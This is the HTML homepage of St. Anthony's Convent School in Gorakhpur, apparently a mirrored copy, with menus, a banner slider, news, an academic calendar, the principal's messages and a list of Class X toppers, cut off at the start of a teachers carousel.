<!DOCTYPE>
<html>
<!-- Mirrored from php.themewant.com/unipix/index-two.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 May 2025 07:44:43 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>St. Anthony’s Convent School</title>
    <link rel="shortcut icon" type="image/x-icon" href="assets/images/logo/emblem%201.jpg">
    <!-- animate css -->
    <link rel="stylesheet" href="assets/css/plugins/animate.min.css">
    <!-- fontawesome 6.4.2 -->
    <link rel="stylesheet" href="assets/css/plugins/fontawesome.min.css">
    <!-- bootstrap min css -->
    <link rel="stylesheet" href="assets/css/vendor/bootstrap.min.css">
    <!-- swiper Css 10.2.0 -->
    <link rel="stylesheet" href="assets/css/plugins/swiper.min.css">
    <!-- Bootstrap 5.0.2 -->
    <link rel="stylesheet" href="assets/css/vendor/magnific-popup.css">
    <!-- metismenu scss -->
    <link rel="stylesheet" href="assets/css/vendor/metismenu.css">
    <!-- nice select js -->
    <link rel="stylesheet" href="assets/css/plugins/nice-select.css">
    <link rel="stylesheet" href="assets/css/plugins/jquery-ui.css">
    <!-- custom style css -->
    <link rel="stylesheet" href="assets/css/style.css">
    <link href="assets/css/flexslider.css" rel="stylesheet" />

</head>

<body>
    <!-- Top Contact Bar -->
    <div class="top-bar">
        <div class="top-bar-container">
            <div class="contact-details">
                📞 <a href="tel:+919876543210">0551-228 0250</a> &nbsp; | &nbsp;
                📧 <a href="mailto:stanthony100@gmail.com">stanthony100@gmail.com</a>
               <span style="padding-left:12px;">Affiliation Number- 2131306</span>
            </div>
            <div class="social-icons">
                <a href="https://www.facebook.com/share/16NQD98XaQ/" target="_blank"><i class="fab fa-facebook-f"></i></a>
                <a href="#" target="_blank"><i class="fab fa-instagram"></i></a>
                <a href="https://youtube.com/@stanthonyconvent5802" target="_blank"><i class="fab fa-youtube"></i></a>
                <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
            </div>
        </div>
    </div>
    <!-- header area start -->
    <header class="header header__sticky v__2">
        <div class="container-fluid header11topDown">
            <div class="row">
                <div class="col-xl-12">
                    <div class="header__wrapper">
                        <div class="header__logo d-flex align-items-center">
                            <a href="index.php" class="d-flex align-items-center text-decoration-none">
                                <img src="assets/images/logo/emblem 1.png" height="80" width="80" alt="St. Anthony’s Convent School Logo" class="me-2" style="object-fit: contain;    padding-left: 9px;width:23%;">
                                <div class="school-name text-dark">
                                    <h5 class="mb-0 fw-bold" style="font-size: 18px; line-height: 1.2;">St. Anthony’s Convent School</h5>
                                    <small class="text-muted" style="font-size: 13px;">Gorakhpur • Serve in Love</small>
                                </div>
                            </a>
                        </div>

                        <div class="header__menu">
                            <div class="navigation">
                                <nav class="navigation__menu">
                                    <ul>
                                        <li class="navigation__menu--item has-child">
                                            <a href="index.php" class="navigation__menu--item__link">Home</a>
                                             
                                        </li> 
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">About Us</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=about-us">About Us</a></li>
                                                                                                    <li><a href="content.php?slug=objectives">Objectives</a></li>
                                                                                                <li><a href="principal.php">Principal Desk </a></li>
                                            </ul>
                                        </li>

                                        
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">Curriculam</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=fees-structure">Fees Structure</a></li>
                                                                                                    <li><a href="content.php?slug=admission-details">Admission Details</a></li>
                                                                                                    <li><a href="content.php?slug=attendance-and-absence">Attendance And Absence</a></li>
                                                                                                    <li><a href="content.php?slug=holidays">Holidays</a></li>
                                                                                                    <li><a href="content.php?slug=behaviour-discipline-policy">Behaviour/Discipline Policy</a></li>
                                                                                                    <li><a href="content.php?slug=co-curricular-activities">Co-Curricular Activities</a></li>
                                                                                                    <li><a href="content.php?slug=school-timings">School Timings</a></li>
                                                                                                    <li><a href="content.php?slug=fee-structure">TEACHING STAFF</a></li>
                                                                                                    <li><a href="content.php?slug=the-curriculum">The Curriculum</a></li>
                                                                                                    <li><a href="content.php?slug=general-information">General Information</a></li>
                                                                                                    <li><a href="content.php?slug=academic-calander">ACADEMIC  CALANDER</a></li>
                                                                                                    <li><a href="content.php?slug=parent-teacher-association">PARENT-TEACHER ASSOCIATION</a></li>
                                                                                                    <li><a href="content.php?slug=copies-of-valid-water-health-and-sanitation-certificates">WATER, HEALTH AND SANITATION CERTIFICATES</a></li>
                                                                                                    <li><a href="content.php?slug=result-of-last-five-years">RESULT OF LAST FIVE YEARS</a></li>
                                                                                                    <li><a href="content.php?slug=no-objection-certificate-noc-by-the-state-govt-up">NO OBJECTION CERTIFICATE (NOC) BY THE STATE GOVT./UP</a></li>
                                                                                                    <li><a href="content.php?slug=societies-trust-company-registration-renewal-certificate">SOCIETIES/TRUST/COMPANY REGISTRATION/RENEWAL CERTIFICATE</a></li>
                                                                                                    <li><a href="content.php?slug=affiliation-upgradation-letter-and-recent-extension-of-affiliation">AFFILIATION/UPGRADATION LETTER AND RECENT EXTENSION OF AFFILIATION</a></li>
                                                                                                    <li><a href="content.php?slug=school-infrasturcture">SCHOOL INFRASTURCTURE</a></li>
                                                                                                    <li><a href="content.php?slug=the-deo-certificate-submitted-by-the-school-for-affiliation-upgradation-extension-of-affiliation-or-self-certification-by-school">THE DEO CERTIFICATE SUBMITTED BY THE SCHOOL FOR AFFILIATION/UPGRADATION/EXTENSION OF AFFILIATION OR SELF CERTIFICATION BY SCHOOL</a></li>
                                                                                                    <li><a href="content.php?slug=copy-of-valid-building-safety-certificate-as-per-the-national-building-code-">COPY OF VALID BUILDING SAFETY CERTIFICATE AS PER THE NATIONAL BUILDING CODE*</a></li>
                                                                                                    <li><a href="content.php?slug=copy-of-valid-fire-safety-certificate-issued-by-the-competent-authority-">COPY OF VALID FIRE SAFETY CERTIFICATE ISSUED BY THE COMPETENT AUTHORITY*</a></li>
                                                                                                    <li><a href="content.php?slug=list-of-school-management-committee-smc-">LIST OF SCHOOL MANAGEMENT COMMITTEE (SMC)</a></li>
                                                                                            </ul>
                                        </li>
                                        
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">Facilities</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=library">Library</a></li>
                                                                                                    <li><a href="content.php?slug=parents-teachers-interaction">Parents/Teachers Interaction</a></li>
                                                                                                    <li><a href="content.php?slug=computer-lab">COMPUTER LAB</a></li>
                                                                                                    <li><a href="content.php?slug=physics-lab">PHYSICS LAB</a></li>
                                                                                                    <li><a href="content.php?slug=biology-lab">BIOLOGY LAB</a></li>
                                                                                                    <li><a href="content.php?slug=chemistry-lab">CHEMISTRY LAB</a></li>
                                                                                            </ul>
                                        </li>

                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="#" class="navigation__menu--item__link">Achievements</a>
                                            <ul class="submenu sub__style">
                                                <li><a href="toppers-x.php">Toppers X</a></li>
                                                <li><a href="toppers-xii.php">Toppers XII</a></li>
                                            </ul>
                                        </li>

                                         
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="#" class="navigation__menu--item__link">Gallery</a>
                                            <ul class="submenu sub__style">
                                                <li><a href="event_gallery.php">Event Gallery</a></li>
                                                <!--<li><a href="menu/VideoGallery/Default.php">Video Gallery</a></li>-->
                                            </ul>
                                        </li>
                                         <li class="navigation__menu--item has-child">
                                            <a href="tc.php" class="navigation__menu--item__link">Tc</a>
                                             
                                        </li> 

                                        <li class="navigation__menu--item">
                                            <a href="contact.php" class="navigation__menu--item__link">Contact</a>
                                        </li>
                                    </ul>
                                </nav>
                            </div>
                        </div>
                        <div class="header__right">
                            <div class="header__right--item">
                                <div id="menu-btn" class="menu__trigger">
                                    <i class="fa-solid fa-bars"></i>
                                    <!--<img src="assets/images/icon/menu__bar.svg" alt="bar">-->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>




     



<style>
    .hero {
        position: relative;
        height: 92vh;
        overflow: hidden;
    }

    .slider-container {
        position: relative;
        width: 100%;
        height: 100%;
    }

    .slide {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0;
        transition: opacity 1s ease-in-out;
        background-size: cover;
        background-position: center;
    }

    .slide.active {
        opacity: 1;
    }

    .hero__content-wrap {
        position: absolute;
        bottom: 50px;
        left: 40px;
        z-index: 2;
        width: auto;
        padding: 0px 13px;
        /*background: #002f59;*/
        border-radius: 5px;
    }

    .hero__content-wrap .section-title {
        color: white;
    }

    .hero__content-wrap .sub-title {
        display: block;
        font-size: 18px;
        margin-bottom: 10px;
        opacity: 0;
        transform: translateY(20px);
        animation: fadeInUp 1s ease-out 0.5s forwards;
        color: white;
    }

    .hero__content-wrap .title {
       font-size: 20px;
        line-height: 28px;
        color: white;
        font-weight: bold;
        margin-bottom: 0;
        opacity: 0;
        transform: translateY(20px);
        animation: fadeInUp 1s ease-out 0.8s forwards;
        padding-bottom: 16px;
    }

    @keyframes fadeInUp {
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    .slider-nav {
        position: absolute;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%);
        display: flex;
        gap: 10px;
        z-index: 3;
    }

    .nav-dot {
        width: 12px;
        height: 12px;
        border-radius: 50%;
        background: rgba(255, 255, 255, 0.5);
        cursor: pointer;
        transition: all 0.3s ease;
    }

    .nav-dot.active {
        background: white;
        transform: scale(1.2);
    }

    .slider-arrows {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        background: rgba(255, 255, 255, 0.2);
        color: white;
        border: none;
        width: 50px;
        height: 50px;
        border-radius: 50%;
        cursor: pointer;
        font-size: 18px;
        transition: all 0.3s ease;
        z-index: 3;
    }

    .slider-arrows:hover {
        background: rgba(255, 255, 255, 0.3);
        transform: translateY(-50%) scale(1.1);
    }

    .prev {
        left: 20px;
    }

    .next {
        right: 20px;
    }

    .slide-overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 1;
        background: rgba(0, 0, 0, 0.2);
    }

    @media (max-width: 768px) {
        .hero {
            height: 44vh !important;
            overflow: hidden;
        }

        .hero__content-wrap {
            bottom: 67px;
            left: 89px;
            padding: 0px 12px;
        }

        .hero__content-wrap .title {
           font-size: 15px !important;
            color: white;
            font-weight: bold;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 1s ease-out 0.8s forwards;
                padding-bottom: 12px;
        }

        .sub-title {
            font-size: 14px;
            margin-bottom: 8px;
        }
    }
</style>

<section class="hero" style="margin-top: 3%;">
    <div class="slider-container">
        
            <div class="slide active" style="background-image: url('upload/banners/banner-2026-08-08-103229.php')">
                <div class="slide-overlay"></div>
                <div class="container">
                    <div class="hero__content-wrap">
                        <div class="section-title">
                            <span class="sub-title">test</span>
                            <h1 class="title">test</h1>
                        </div>
                    </div>
                </div>
            </div>
            <div class="slide " style="background-image: url('upload/banners/banner-2026-07-24-081441.jpeg')">
                <div class="slide-overlay"></div>
                <div class="container">
                    <div class="hero__content-wrap">
                        <div class="section-title">
                            <span class="sub-title"></span>
                            <h1 class="title">ST ANTHONYS CONVENT SCHOOL</h1>
                        </div>
                    </div>
                </div>
            </div>
            <div class="slide " style="background-image: url('upload/banners/banner-2026-04-29-112029.jpeg')">
                <div class="slide-overlay"></div>
                <div class="container">
                    <div class="hero__content-wrap">
                        <div class="section-title">
                            <span class="sub-title"></span>
                            <h1 class="title">CBSE School In Gorakhpur</h1>
                        </div>
                    </div>
                </div>
            </div>
            <div class="slide " style="background-image: url('upload/banners/banner-2025-08-06-151137.jpeg')">
                <div class="slide-overlay"></div>
                <div class="container">
                    <div class="hero__content-wrap">
                        <div class="section-title">
                            <span class="sub-title"></span>
                            <h1 class="title">Best CBSE School in Gorakhpur</h1>
                        </div>
                    </div>
                </div>
            </div>
            <div class="slide " style="background-image: url('upload/banners/banner-2025-08-06-151031.jpg')">
                <div class="slide-overlay"></div>
                <div class="container">
                    <div class="hero__content-wrap">
                        <div class="section-title">
                            <span class="sub-title"></span>
                            <h1 class="title">Best CBSE School in Gorakhpur</h1>
                        </div>
                    </div>
                </div>
            </div>
            <div class="slide " style="background-image: url('upload/banners/banner-2025-08-01-164229.JPG')">
                <div class="slide-overlay"></div>
                <div class="container">
                    <div class="hero__content-wrap">
                        <div class="section-title">
                            <span class="sub-title"></span>
                            <h1 class="title">Best CBSE School in Gorakhpur</h1>
                        </div>
                    </div>
                </div>
            </div>
            <div class="slide " style="background-image: url('upload/banners/banner-2025-08-01-163334.JPG')">
                <div class="slide-overlay"></div>
                <div class="container">
                    <div class="hero__content-wrap">
                        <div class="section-title">
                            <span class="sub-title"></span>
                            <h1 class="title">Best CBSE School in Gorakhpur</h1>
                        </div>
                    </div>
                </div>
            </div>    </div>

    <!-- Navigation arrows -->
    <button class="slider-arrows prev" onclick="changeSlide(-1)">❮</button>
    <button class="slider-arrows next" onclick="changeSlide(1)">❯</button>

    <!-- Navigation dots -->
    <div class="slider-nav">
        <span class="nav-dot active" onclick="currentSlide(0)"></span><span class="nav-dot " onclick="currentSlide(1)"></span><span class="nav-dot " onclick="currentSlide(2)"></span><span class="nav-dot " onclick="currentSlide(3)"></span><span class="nav-dot " onclick="currentSlide(4)"></span><span class="nav-dot " onclick="currentSlide(5)"></span><span class="nav-dot " onclick="currentSlide(6)"></span>    </div>
</section>

<script>
    let currentSlideIndex = 0;
    const slides = document.querySelectorAll('.slide');
    const dots = document.querySelectorAll('.nav-dot');
    const totalSlides = slides.length;
    let autoSlideInterval;

    function showSlide(index) {
        if (index < 0) index = totalSlides - 1;
        if (index >= totalSlides) index = 0;

        currentSlideIndex = index;

        slides.forEach((slide, i) => {
            slide.classList.toggle('active', i === currentSlideIndex);
        });

        dots.forEach((dot, i) => {
            dot.classList.toggle('active', i === currentSlideIndex);
        });

        // Re-apply animations
        const textElements = slides[currentSlideIndex].querySelectorAll('.sub-title, .title');
        textElements.forEach(el => {
            el.style.animation = 'none';
            el.offsetHeight;
            el.style.animation = '';
        });
    }

    function changeSlide(direction) {
        showSlide(currentSlideIndex + direction);
        resetAutoSlide();
    }

    function currentSlide(index) {
        showSlide(index);
        resetAutoSlide();
    }

    function startAutoSlide() {
        autoSlideInterval = setInterval(() => {
            showSlide(currentSlideIndex + 1);
        }, 3000);
    }

    function resetAutoSlide() {
        clearInterval(autoSlideInterval);
        startAutoSlide();
    }

    document.addEventListener('DOMContentLoaded', () => {
        showSlide(0);
        startAutoSlide();

        document.querySelector('.hero').addEventListener('mouseenter', () => clearInterval(autoSlideInterval));
        document.querySelector('.hero').addEventListener('mouseleave', () => startAutoSlide());

        document.addEventListener('keydown', (e) => {
            if (e.key === 'ArrowLeft') changeSlide(-1);
            if (e.key === 'ArrowRight') changeSlide(1);
        });
    });
</script>
<!-- ============================================================================ -->
<!-- NEWS SECTION -->
<!-- ============================================================================ -->
<div class="news-section">
    <div class="news-header">
        <h2 class="news-title">Latest <span class="highlight">News</span></h2>
        <a href="#" class="see-all-link">
            SEE ALL NEWS <span class="arrow-icon"></span>
        </a>
    </div>
    
    <div class="slider-container">
                <div class="swiper newsSwiper">
            <div class="swiper-wrapper">
                                <div class="swiper-slide">
                    <div class="news-item">
                        <div class="news-number">01</div>
                        <div class="news-content">
                            <div class="news-date">
                                <i class="fas fa-calendar-alt"></i>
                                06-Jun-2026                            </div>
                            <div class="news-title-item">Pre-Board Exam Started</div>
                        </div>
                    </div>
                </div>
                                <div class="swiper-slide">
                    <div class="news-item">
                        <div class="news-number">02</div>
                        <div class="news-content">
                            <div class="news-date">
                                <i class="fas fa-calendar-alt"></i>
                                30-Dec-2025                            </div>
                            <div class="news-title-item">ADMISSION OPEN</div>
                        </div>
                    </div>
                </div>
                            </div>
            <div class="swiper-button-next"></div>
            <div class="swiper-button-prev"></div>
        </div>
            </div>
</div>

<!-- ============================================================================ -->
<!-- ABOUT US SECTION -->
<!-- ============================================================================ -->
<section class="v__2 pb--60 mt--60">
    <div class="container">
        <div class="row align-items-center g-5">
            <div class="col-sm-6 text-center">
                <div class="position-relative">
                                        <img src="upload/about/img.jpg"
                        alt="About Image"
                        class="img-fluid rounded shadow about-us-img">
                                    </div>
            </div>

            <div class="col-sm-6">
                <div class="about__right--content">
                    <div class="about__right--content--sub mb-2 d-flex align-items-center">
                                                <img src="assets/images/icon/e-cap-pix.svg" alt="icon" width="30" class="me-2">
                                                <span>Knowledge meets innovation</span>
                    </div>

                    <h2 class="about__right--content--title">About St. Anthony’s Convent School</h2>

                    <p class="about__right--content--description">
                        At St. Anthony’s Convent School, we believe in the transformative power of education and the boundless potential that resides within each individual.                    </p>
                    <p class="about__right--content--description">
                        Our mission is to foster intellectual curiosity, empower individuals to realize their fullest potential, and contribute meaningfully to the betterment of society.                    </p>

                    <div class="about__right--content--vision mt-4 d-flex flex-wrap gap-4">
                        <div class="mision d-flex align-items-center gap-2">
                                                        <img src="assets/images/icon/mission.svg" alt="" width="32">
                                                        <span>University Mission Statement</span>
                        </div>
                        <div class="vision d-flex align-items-center gap-2">
                                                        <img src="assets/images/icon/vission.svg" alt="" width="32">
                                                        <span>University Vision Achievement</span>
                        </div>
                    </div>

                    <a href="content.php?slug=about-us" class="rts-theme-btn btn-arrow mt-4">
                        About Us <span><i class="fa-regular fa-arrow-right"></i></span>
                    </a>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- ============================================================================ -->
<!-- PRINCIPAL MESSAGE -->
<!-- ============================================================================ -->
<section class="mt--10">
    <div class="container">
                <div class="swiper aboutSwiper" data-swiper='{
            "loop": true,
            "autoplay": { "delay": 6000 },
            "pagination": { "el": ".swiper-pagination", "clickable": true }
        }'>
            <div class="swiper-wrapper">
                                <div class="swiper-slide">
                    <div class="row align-items-center g-5">
                        <div class="col-md-4">
                            <div class="about__left--content text-center">
                                <img src="upload/messages/banner-2025-08-06-150041.JPG" 
                                     alt="Principal" 
                                     class="img-fluid rounded shadow" 
                                     style="max-height:500px;width:100%">
                            </div>
                        </div>
                        <div class="col-md-8">
                            <div class="about__right--content">
                                <div class="about__right--content--sub mb-2">
                                    <img src="assets/images/icon/e-cap-pix.svg" alt="icon"> 
                                    Principal                                </div>
                                <h2 class="about__right--content--title">Principal</h2>
                                <p class="about__right--content--description">Greetings from the desk of principal. As we have headed to the new academic year I extend my warmest wishes and blessings to my students, staff, parents and our viewers. Every academic year bring along with new vigour, opportunities and the determination to fulfil ones dreams.                                                   St. Anthony’s Convent School is here to make realize and achieve our students dreams and aspirations and render support to pursue it with zeal and enthusiasm. Our aim is to make every student a ‘Beacon of Hope’ for oneself, family and for the society. St. Anthony’s Convent School exist to create a positive learning environment for every student and encourage to build their potentialities. They are being accompanied every moment. It is ‘a home away from home’ for every child. It is a temple of knowledge and wisdom where everyone is welcomed and accepted, taken care and listened to; irrespective of caste, creed, colour, status, religion and gender. Every action is led to the total development of the student and to inculcate moral, spiritual, ethical and civic values in students. Let us together in partnership build a contributing and utilitarian young generation.</p>
                            </div>
                        </div>
                    </div>
                </div>
                            </div>
            <div class="swiper-pagination mt-4 text-center"></div>
        </div>
            </div>
</section>

<!-- ============================================================================ -->
<!-- ACADEMIC CALENDAR & PRINCIPAL'S MESSAGE -->
<!-- ============================================================================ -->
<div class="academic-card-container">
    <!-- Academic Calendar Card -->
    <div class="academic-calendar-card">
        <div class="academic-card-header">
            <div class="academic-decorative-element"></div>
            <h2 class="academic-card-title">Academic Calendar</h2>
        </div>
        <div class="academic-card-body">
            <div class="academic-current-date">
                <div class="academic-date-number">11</div>
                <div class="academic-date-info">August 2026 • Tuesday</div>
            </div>
            
            <div class="academic-upcoming-events">
                <h3 class="academic-section-title">Upcoming Events</h3>
                
                <div class="academic-events-swiper" id="academicEventsSwiper">
                    <div class="academic-swiper-wrapper" id="academicSwiperWrapper">
                        <div class="academic-swiper-slide"><div class="academic-event">
                                <div class="academic-event-date">04-09-2025</div>
                                <div class="academic-event-title">Teacher&apos;s Day Celebration </div>
                            </div><div class="academic-event">
                                <div class="academic-event-date">06-09-2025</div>
                                <div class="academic-event-title">Teacher&apos;s Training on Financial Literacy and Use of Digital Tools</div>
                            </div></div><div class="academic-swiper-slide"><div class="academic-event">
                                <div class="academic-event-date">08-09-2025</div>
                                <div class="academic-event-title">Half-yearly Examination Started </div>
                            </div><div class="academic-event">
                                <div class="academic-event-date">2025-06-15</div>
                                <div class="academic-event-title">School Reopens for New Academic Session</div>
                            </div></div><div class="academic-swiper-slide"><div class="academic-event">
                                <div class="academic-event-date">2025-07-05</div>
                                <div class="academic-event-title">Investiture Ceremony</div>
                            </div><div class="academic-event">
                                <div class="academic-event-date">2025-08-15</div>
                                <div class="academic-event-title">Independence Day Celebration</div>
                            </div></div><div class="academic-swiper-slide"><div class="academic-event">
                                <div class="academic-event-date">2025-09-05</div>
                                <div class="academic-event-title">Teacher&apos;s Day Celebration</div>
                            </div><div class="academic-event">
                                <div class="academic-event-date">2025-10-02</div>
                                <div class="academic-event-title">Gandhi Jayanti Holiday</div>
                            </div></div><div class="academic-swiper-slide"><div class="academic-event">
                                <div class="academic-event-date">2025-11-14</div>
                                <div class="academic-event-title">Children&apos;s Day Function</div>
                            </div><div class="academic-event">
                                <div class="academic-event-date">2025-12-20</div>
                                <div class="academic-event-title">Christmas Carnival</div>
                            </div></div><div class="academic-swiper-slide"><div class="academic-event">
                                <div class="academic-event-date">2026-01-26</div>
                                <div class="academic-event-title">Republic Day Celebration</div>
                            </div><div class="academic-event">
                                <div class="academic-event-date">2026-02-10</div>
                                <div class="academic-event-title">Annual Sports Meet</div>
                            </div></div><div class="academic-swiper-slide"><div class="academic-event">
                                <div class="academic-event-date">2026-03-20</div>
                                <div class="academic-event-title">Final Examinations Begin</div>
                            </div><div class="academic-event">
                                <div class="academic-event-date">22-09-2025</div>
                                <div class="academic-event-title">Inter House Sports Competition for Nursrey and KGs</div>
                            </div></div>                    </div>
                    
                    <div class="academic-swiper-navigation">
                        <button class="academic-swiper-btn" id="academicPrevBtn">‹</button>
                        <button class="academic-swiper-btn" id="academicNextBtn">›</button>
                    </div>
                    
                    <div class="academic-swiper-pagination" id="academicPagination">
                                                    <div class="academic-swiper-dot academic-active" data-slide="0"></div>
                                                    <div class="academic-swiper-dot " data-slide="1"></div>
                                                    <div class="academic-swiper-dot " data-slide="2"></div>
                                                    <div class="academic-swiper-dot " data-slide="3"></div>
                                                    <div class="academic-swiper-dot " data-slide="4"></div>
                                                    <div class="academic-swiper-dot " data-slide="5"></div>
                                                    <div class="academic-swiper-dot " data-slide="6"></div>
                                            </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Principal's Daily Thought Card -->
    <div class="thought-principal-card">
        <div class="academic-card-header">
            <div class="academic-decorative-element"></div>
            <h2 class="academic-card-title">Principal's Message</h2>
        </div>
        <div class="academic-card-body">
            <div class="row">
                <div class="col-lg-6">
                    <div class="thought-principal-image" style="background: url('upload/thought/3071757042296.jpeg') center/cover;"></div>
                </div>
                <div class="col-lg-6">
                    <div class="thought-principal-name">SR. ELIZABETH</div>
                    <div class="thought-principal-title">Principal</div>
                </div>
            </div>
            <div class="thought-daily-thought">
                <h3 class="thought-section-title">Today's Thought</h3>
                <div class="thought-text">            Dear student, teachers, parents and all the stakeholders of St. Anthony&apos;s Convent School as we begin the new academic year, I extend warm greeting to you all. Welcome back to the school, students and parents who are already a part of our St. Anthony&apos;s family and a wholehearted welcome to the new students and parents who are newly joining our school for the first time. Let us start this academic year 2026-27 with eagerness, joy and gusto.
  
St. Anthony&apos;s Convent School was, is and will be always &apos;A home away from Home&apos; for all its students. It is just a pure &quot;Temple of Education&quot; where along with intellectual development - personal character building, emotional wellbeing, psychological balancing, social healthy inter and interpersonal relationship is developed. Spiritual and moral values are inculcated in every student. Career preparation and engagement in extracurricular activities are conducted to build resilience and leadership.  

We welcome and love every student to our school impartially. To our parents: thank you for your continued partnership. To our students: aim high and grow without boundaries. Let us all together make this academic year an enjoyable and productive one.  

Sr. Elizabeth</div>
                <div class="thought-author">— Daily Inspiration</div>
            </div>
        </div>
    </div>
</div>

<!-- ============================================================================ -->
<!-- TOPPERS & BIRTHDAYS -->
<!-- ============================================================================ -->
<div class="tpr-slider row">
    <div class="col-lg-6">
        <div class="topper_box">
            <div class="topperIn">
                <h1 class="hwhite w-line">Toppers 2024-25<span class="color1"> </span></h1>

                <!-- Toppers Class X -->
                <div class="topper_x">
                    <div class="theading">Class: X</div>
                                        <div id="tpr_x" class="flexslider">
                        <ul class="slides">
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-080120.png" />
                                <span style="color:white;font-size: 13px;">Mayank Hembram</span><br>
                                <span style="color:white;margin-bottom:10px">96% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-080355.png" />
                                <span style="color:white;font-size: 13px;">Aryushi Singh</span><br>
                                <span style="color:white;margin-bottom:10px">95% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-080453.png" />
                                <span style="color:white;font-size: 13px;">Kushagra Gupta</span><br>
                                <span style="color:white;margin-bottom:10px">94.4% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-080555.png" />
                                <span style="color:white;font-size: 13px;">Shubhi Chaudhary</span><br>
                                <span style="color:white;margin-bottom:10px">94.4% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-080818.png" />
                                <span style="color:white;font-size: 13px;">Avi Srivastava</span><br>
                                <span style="color:white;margin-bottom:10px">94.2% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-080923.png" />
                                <span style="color:white;font-size: 13px;">Daisy Rani</span><br>
                                <span style="color:white;margin-bottom:10px">94% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-081029.png" />
                                <span style="color:white;font-size: 13px;">Riya Singh</span><br>
                                <span style="color:white;margin-bottom:10px">93% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-081129.png" />
                                <span style="color:white;font-size: 13px;">Kaustub Mani Shukla</span><br>
                                <span style="color:white;margin-bottom:10px">92.2% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-081250.png" />
                                <span style="color:white;font-size: 13px;">Mangalam Mishra</span><br>
                                <span style="color:white;margin-bottom:10px">92% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-081436.png" />
                                <span style="color:white;font-size: 13px;">Shaurya Raj</span><br>
                                <span style="color:white;margin-bottom:10px">92% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-081547.png" />
                                <span style="color:white;font-size: 13px;">Sunidhi Tripathi</span><br>
                                <span style="color:white;margin-bottom:10px">92% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-081642.png" />
                                <span style="color:white;font-size: 13px;">Keerti Prakash Pandey</span><br>
                                <span style="color:white;margin-bottom:10px">92% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-081756.png" />
                                <span style="color:white;font-size: 13px;">Mannat Gupta</span><br>
                                <span style="color:white;margin-bottom:10px">91.2% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-081843.png" />
                                <span style="color:white;font-size: 13px;">Aastha Singh</span><br>
                                <span style="color:white;margin-bottom:10px">91% </span>
                            </li>
                                                        <li>
                                <img src="upload/toppers/topper-2026-05-01-081934.png" />
                                <span style="color:white;font-size: 13px;">Pratyush Gupta</span><br>
                                <span style="color:white;margin-bottom:10px">90.4% </span>
                            </li>
                                                    </ul>
                    </div>
                    <div class="pg-rmore">
                        <a class="readmore1" href="toppers-x.php"><span>View All</span></a>
                    </div>
                                    </div>

                <!-- Toppers Class XII -->
                <div class="topper_xii">
                    <div class="theading">Class: XII</div>
                                            <div class="alert alert-warning text-center">No Class: XII toppers found.</div>
                                    </div>
            </div>
        </div>
    </div>

    <div class="col-lg-6">
        <div class="topper_box" style="background: url(assets/images/blue-bg.jpg);">
            <div class="topperIn">
                <h1 class="hwhite w-line">Today's<span class="color1"> Birthdays</span></h1>

                <!-- Students' Birthdays -->
                <div class="topper_x">
                    <div class="theading">Students</div>
                                            <div class="alert alert-warning text-center">No student birthdays today.</div>
                                    </div>

                <!-- Teachers' Birthdays -->
                <div class="topper_xii">
                    <div class="theading">Teachers</div>
                                            <div class="alert alert-warning text-center">No teacher birthdays today.</div>
                                    </div>
            </div>
        </div>
    </div>
</div>

<!-- ============================================================================ -->
<!-- TEACHERS SECTION -->
<!-- ============================================================================ -->
<section class="teachers rts-section-padding">
    <div class="container">
        <div class="row">
            <div class="col-sm-12 text-center">
                <div class="rts__section--wrapper v__9">
                    <h2 class="rts__section--title">Our Teachers</h2>
                    <p class="rts__section--description">Meet our dedicated educators who inspire and guide</p>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-lg-12">
                                <div class="rts__testimonial--active swiper swiper-data" data-swiper='{
                    "slidesPerView":3,
                    "loop": true,
                    "speed": 1000,
                    "pagination":{"el":".rts__pagination","clickable": true},
                    "autoplay":{"delay": 6000},
                    "breakpoints":{
                        "320":{"slidesPerView": 1},
                        "575":{"slidesPerView": 1},
                        "768":{"slidesPerView": 2},
                        "991":{"slidesPerView": 3},
                        "1201":{"slidesPerView": 4}
                    }
                }'>
                    <div class="swiper-wrapper">
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 bg-white border rounded shadow-sm text-center h-100 d-flex flex-column">
